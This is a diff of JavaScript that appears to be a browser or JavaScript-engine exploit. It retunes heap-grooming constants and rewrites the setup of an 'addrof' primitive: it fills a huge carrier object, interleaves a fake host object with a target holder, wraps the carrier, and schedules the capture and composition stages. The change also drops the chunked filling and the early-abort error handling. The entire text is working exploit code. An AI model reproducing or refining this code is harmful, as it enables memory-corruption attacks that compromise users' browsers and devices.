@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 512;
+let DRAIN_COUNT = 384;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -19,10 +19,9 @@ const CARRIER_SLOTS = (function () {
         const n = q ? parseInt(q, 10) : 0;
         if (n >= 100000 && n <= 40000000) return n;
     } catch (e) { }
-    return 8000000;
+    return 12000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
-const CARRIER_CHUNK = 200000;
 const CAPTURE_DELAY_MS = 50;
 const COMPOSE_DELAY_MS = 100;
 
@@ -622,45 +621,20 @@ function prepareAddrof() {
     capturedWords = new Uint16Array(16);
     getterCarrier = function getterCarrierFunction() { return 7; };
 
-    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}-chunk=${CARRIER_CHUNK}`);
+    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     getterCarrier[0] = fakeHost;
+    for (let i = 1; i < CARRIER_SLOTS; i++)
+        getterCarrier[i] = 0;
+    getterCarrier[1] = targetHolder;
+    getterCarrier[2] = fakeHost;
+    getterCarrier[3] = targetHolder;
+    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
 
-    let slot = 1;
-    function fillCarrierChunk() {
-        if (stopped || fakeReleased) return;
-        const end = Math.min(slot + CARRIER_CHUNK, CARRIER_SLOTS);
-        try {
-            for (; slot < end; slot++)
-                getterCarrier[slot] = 0;
-        } catch (error) {
-            finishEarlySafeAttempt("CARRIER-OOM",
-                `${error?.name}:${String(error?.message).slice(0, 80)}`,
-                "carrier-fill");
-            return;
-        }
-        if (slot < CARRIER_SLOTS) {
-            setTimeout(fillCarrierChunk, 0);
-            return;
-        }
-        getterCarrier[1] = targetHolder;
-        getterCarrier[2] = fakeHost;
-        getterCarrier[3] = targetHolder;
-        emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+    emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
 
-        try {
-            preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-        } catch (error) {
-            finishEarlySafeAttempt("WRAPPER-THREW",
-                `${error?.name}:${String(error?.message).slice(0, 80)}`,
-                "symbol-wrapper");
-            return;
-        }
-        emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
-
-        setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
-        setTimeout(beginComposition, COMPOSE_DELAY_MS);
-    }
-    fillCarrierChunk();
+    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+    setTimeout(beginComposition, COMPOSE_DELAY_MS);
 }
 
 function runAddrofCapture() {
